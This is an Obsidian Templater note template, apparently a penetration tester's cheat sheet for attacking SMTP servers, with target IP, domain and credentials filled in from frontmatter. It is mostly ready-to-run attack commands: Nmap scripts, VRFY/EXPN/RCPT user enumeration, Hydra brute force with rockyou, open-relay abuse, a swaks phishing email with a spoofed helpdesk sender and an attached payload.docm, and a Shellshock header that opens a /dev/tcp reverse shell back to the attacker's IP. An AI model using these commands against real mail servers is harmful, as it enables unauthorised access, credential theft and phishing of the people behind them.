<%-*
if (tp.frontmatter.current_port == undefined) {
  tp.frontmatter.current_port = await tp.system.prompt('Enter SMTP port: ')
}
-%>
# SMTP — Port <% tp.frontmatter.current_port %>
<%*
let port = parseInt(tp.frontmatter.current_port)
let ip = tp.frontmatter.target_ip
let domain = tp.frontmatter.domain
let user = tp.frontmatter.username || '<user>'
let pass = tp.frontmatter.password || '<pass>'
let tls = (port === 465 || port === 587) ? true : false
-%>

---

## Nmap
```bash
nmap -p<% port %> --script=smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-vuln-cve2010-4344 <% ip %>
```

---

## Banner & EHLO
```bash
nc -nv <% ip %> <% port %>
# After connecting:
# EHLO domain.local
```

```bash
# STARTTLS capable (port 587 / 25 with STARTTLS)
openssl s_client -starttls smtp -connect <% ip %>:<% port %>
```

```bash
# SMTPS implicit TLS (port 465)
openssl s_client -connect <% ip %>:465
```

```bash
nmap -p<% port %> --script=smtp-commands <% ip %>
```

---

## User Enumeration
```bash
# VRFY — check if user exists
nc -nv <% ip %> <% port %>
VRFY <% user %>
VRFY root
VRFY administrator
```

```bash
# EXPN — expand mailing list
nc -nv <% ip %> <% port %>
EXPN admin
EXPN postmaster
```

```bash
# RCPT TO — check if address is valid
nc -nv <% ip %> <% port %>
MAIL FROM: test@test.com
RCPT TO: <% user %>@<% domain %>
```

```bash
# Automated SMTP user enumeration
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <% ip %> -p <% port %>
smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -D <% domain %> -t <% ip %> -p <% port %>
smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <% ip %> -p <% port %>
```

```bash
# NetExec
nxc smtp <% ip %> -u users.txt -p '' --no-bruteforce
```

---

## Auth Testing

### AUTH PLAIN / LOGIN (manual)
```bash
# Base64 encode creds: printf '\x00user\x00pass' | base64
# Then: AUTH PLAIN <base64>
openssl s_client -starttls smtp -connect <% ip %>:<% port %>
# EHLO attacker.com
# AUTH LOGIN
# <base64 username>
# <base64 password>
```

```bash
# Automated auth test
nxc smtp <% ip %> -u '<% user %>' -p '<% pass %>'
```

---

## Send Email (if authenticated or open relay)
```bash
sendEmail -t target@<% domain %> -f attacker@attacker.com -s <% ip %>:<% port %> -u "Test" -m "Test body" -xu '<% user %>' -xp '<% pass %>'
```

```bash
swaks --to target@<% domain %> --from attacker@attacker.com --server <% ip %>:<% port %> --auth LOGIN --auth-user '<% user %>' --auth-password '<% pass %>'
```

```bash
# Phishing with attachment
swaks --to victim@<% domain %> --from helpdesk@<% domain %> --server <% ip %>:<% port %> \
  --auth LOGIN --auth-user '<% user %>' --auth-password '<% pass %>' \
  --header "Subject: Password Reset Required" \
  --body "Please review the attached document." \
  --attach /tmp/payload.docm
```

---

## Open Relay Test
```bash
nmap -p<% port %> --script=smtp-open-relay --script-args smtp-open-relay.domain=<% domain %> <% ip %>
```

```bash
# Manual test — try relaying mail through the server without auth
nc <% ip %> <% port %>
EHLO attacker.com
MAIL FROM: <attacker@attacker.com>
RCPT TO: <external@gmail.com>
DATA
Subject: Open Relay Test
This is a test.
.
QUIT
```

---

## Brute Force
```bash
hydra -l '<% user %>' -P /usr/share/wordlists/rockyou.txt smtp://<% ip %> -s <% port %> -t 4
```

```bash
nxc smtp <% ip %> -u users.txt -p passwords.txt
```

---

## Exploit: Shellshock via Email (old Postfix + procmail)
```bash
swaks --server <% ip %> --to <user>@<% domain %> --header 'X-Header: () { :;}; /bin/bash -i >& /dev/tcp/<% tp.frontmatter.my_ip %>/4444 0>&1'
```

---

## Config Locations
```
/etc/postfix/main.cf          — Postfix config
/etc/exim4/exim4.conf.template — Exim config
/etc/sendmail.cf               — Sendmail config
/var/mail/                     — Mail spool
/var/log/mail.log              — Mail log (Debian/Ubuntu)
/var/log/maillog               — Mail log (RHEL/CentOS)
```

---

## Notes
